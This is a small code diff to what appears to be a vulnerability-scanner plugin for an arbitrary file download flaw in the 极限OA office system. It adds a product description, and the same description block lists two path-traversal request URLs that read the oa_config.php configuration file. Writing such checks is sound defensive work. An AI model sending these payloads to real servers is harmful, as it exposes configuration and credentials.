@@ -11,6 +11,7 @@ class Vuln(ABVuln):
     type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-07-16'  # 漏洞公布时间
     desc = '''
+        极限OA网络智能办公系统是一款办公软件，运行环境支持Win9x/Me/NT/2000/XP/2003。
         极限OA 任意文件下载。
         /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
         /module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php
